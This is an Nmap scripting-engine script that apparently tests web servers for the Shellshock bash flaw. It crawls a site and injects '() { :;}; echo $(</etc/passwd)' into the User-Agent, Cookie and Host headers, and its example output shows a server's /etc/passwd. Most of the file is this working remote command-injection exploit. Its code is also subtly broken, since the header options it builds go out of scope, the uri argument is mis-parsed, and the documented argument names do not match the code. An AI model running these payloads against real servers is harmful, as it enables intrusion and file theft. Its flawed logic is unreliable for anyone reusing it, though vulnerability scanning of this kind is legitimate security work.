
description = [[ 
"This script will spider the given URL (or you can give specific URL to test), 
and test for shell shock vulnerbility by accessible /etc/passwd file on the remote machine. 

CVE-2014-6271 : Remote code execution through shell

Reference : 
http://www.troyhunt.com/2014/09/everything-you-need-to-know-about.html
http://www.reddit.com/r/netsec/comments/2hbxtc/cve20146271_remote_code_execution_through_bash/ckrbqac
" ]]

---
-- @usage
--
-- nmap --script http-shellshock --script-args="cookies='SESSIONID=12b20990ae07e1f4b0d121585f7b91cb',depth=20,startpath=/,uri=/cgi-bin/test.cgi" <ip>
--
-- @args http-shockshock.depth			the depth of back traversal. [default : 20]
-- @args http-shockshock.cookie			cookies value for testing in private webpages. [default : nil]
-- @args http-shellshock.startpath		start path of http crawler. [default : /]
-- @args http-shellshock.uri			set this argument if you want to test it in a single uri. [default : nil]
---
--@output
--80/tcp open  http    syn-ack
--| http-shellshock: The system is vulnerable for shellshock
--|   root: x:0:0:root:/root:/bin/bash
--|   bin: x:1:1:bin:/bin:/sbin/nologin
--|   daemon: x:2:2:daemon:/sbin:/sbin/nologin
--|   adm: x:3:4:adm:/var/adm:/sbin/nologin
--|   lp: x:4:7:lp:/var/spool/lpd:/sbin/nologin
--|   sync: x:5:0:sync:/sbin:/bin/sync
--|   shutdown: x:6:0:shutdown:/sbin:/sbin/shutdown
---

author = "Sanoop Thomas (@s4n7h0)"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories =  {"exploit", "intrusive"}

local httpspider = require 'httpspider'
local shortport = require 'shortport'
local url = require 'url'
local http = require 'http'
local table = require "table"
local stdnse = require "stdnse"

portrule = shortport.http

action = function(host, port)
	local url_list = {}
	local fi = {}
	local u1 = {}
	local response
	local flag = 0
	local singleuri,reason = nil
	local cookies = ""
	local startpath = "/"
	local depth = 20

	--setting commandline parameters if user has given any
	if(nmap.registry.args.cookies) then 
		cookies = tostring(nmap.registry.args.cookies) 
	end
	if(nmap.registry.args.startpath) then 
		startpath = tostring(nmap.registry.args.startpath) 
	end
	if(nmap.registry.args.depth) then 
		depth = tonumber(nmap.registry.args.depth) 
	end
	if(nmap.registry.args.uri) then 
		singleuri = tonumber(nmap.registry.args.uri) 
	end

	if singleuri ~= nil then
			response = http.generic_request(host,port,"GET",singleuri,options)
			if response.rawheader ~= nil then
				for key, line in ipairs(response.rawheader) do
		        	if (line:match("(%a+):(%s)x:(%d+):(%d+):(%a+)")) then
		           		table.insert(fi,line)
		               	flag=1
		           	end
			   	end
			end
	else
		--crawler to check all possible urls
	    local crawler = httpspider.Crawler:new(host, port, startpath, { scriptname = SCRIPT_NAME } )
	    crawler:set_timeout(10000)

	    local options = {
	    	header = {
	      		Host = host.ip,
	      		Connection = "close",
	      		["User-Agent"]  = '() { :;}; echo $(</etc/passwd)',
	      		["Content-Type"] = "application/xml",
	    	},
	    	cookie = cookies
	  	}

		local status,r
		while(true) do
			status, r = crawler:crawl()
			-- the crawler wont fails normally, if it does, it can be a number of reasons, 
			-- it's better to do an error handle
			if ( not(status) ) then
				if ( r.err ) then
					return stdnse.format_output(true, "ERROR: %s", r.reason)
				else
					break
				end

			end
			--collecting all urls crawled
			table.insert(url_list, tostring(r.url))
		end
		local i,j,k,l
		--print the url collected  
		for key, uri in ipairs(url_list) do
			u1 = http.parse_url(uri)
			for i,j in pairs(u1) do
				if(i=="path") then
					for tcase = 1, 4 do
						if tcase == 1 then 
							local options = {
		    					header = {
		      						Host = host.ip,
		      						Connection = "close",
		      						["User-Agent"]  = '() { :;}; echo $(</etc/passwd)',
		      						["Cookies"] = cookies,
		      						["Content-Type"] = "application/xml",
		    					}
		  					}
		  					reason = 'User-Agent'
		  				elseif tcase == 2 then 
		  					local options = {
		    					header = {
		      						Host = host.ip,
		      						Connection = "close",
		      						["User-Agent"]  = 'Nmap Scanner',
		      						["Cookies"] = cookies .. '() { :;}; echo $(</etc/passwd)',
		      						["Content-Type"] = "application/xml",
		    					}
		  					}
		  					reason = 'Cookie'
		  				elseif tcase == 3 then 
		  					local options = {
		    					header = {
		      						Host = '() { :;}; echo $(</etc/passwd)',
		      						Connection = "close",
		      						["User-Agent"]  = 'Nmap Scanner',
		      						["Cookies"] = cookies,
		      						["Content-Type"] = "application/xml",
		    					}
		  					}
		  					reason = 'Host'
		  				elseif tcase == 4 then 
		  					local options = {
		    					header = {
		      						Host = host.ip,
		      						Connection = "close",
		      						["Content-Type"] = "application/xml",
		      						["Cookies"] = cookies,
		    					},
		    				'() { :;}; echo $(</etc/passwd)'
		  					}
		  					reason = 'Arbitary Header Parameter'
		  				end
						response = http.generic_request(host,port,"GET",j,options)
						if response.rawheader ~= nil then
							for key, line in ipairs(response.rawheader) do
				     	    	if (line:match("(%a+):(%s)x:(%d+):(%d+):(%a+)")) then
				             		table.insert(fi,line)
				                	flag=1
				            	end
					    	end
					    	if flag==1 then
								break 
					    	end
						end
					end
				end
			end
		end
	end
	if flag == 1 then
		return "This system is vulnerable for shellshock on " .. reason .. stdnse.format_output(true, fi)
	end
	return "test script running"
end